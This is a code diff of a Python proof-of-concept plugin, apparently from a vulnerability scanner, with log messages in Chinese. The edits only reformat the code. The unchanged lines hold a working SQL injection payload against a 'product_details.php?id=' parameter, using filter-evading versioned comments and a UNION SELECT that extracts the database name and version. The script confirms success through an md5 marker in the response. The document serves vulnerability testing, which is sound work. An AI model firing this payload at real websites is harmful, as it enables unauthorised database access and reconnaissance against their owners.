@@ -40,9 +40,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -50,13 +51,12 @@ class Poc(ABPoc):
             payload = "/product_details.php?id=-348'++/*!13337UNION*/+/*!13337SELECT*/+1,2,CONCAT_WS(0x203a20,md5(c),DATABASE(),VERSION()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34--+--"
             url = self.target + payload
             self.output.info('请求网站product_details.php页面')
-            print (url)
+            print(url)
             r = requests.get(url)
 
             if "4a8a08f09d37b73795649038408b5f33" in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name,url=url))
-
+                    target=self.target, name=self.vuln.name, url=url))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
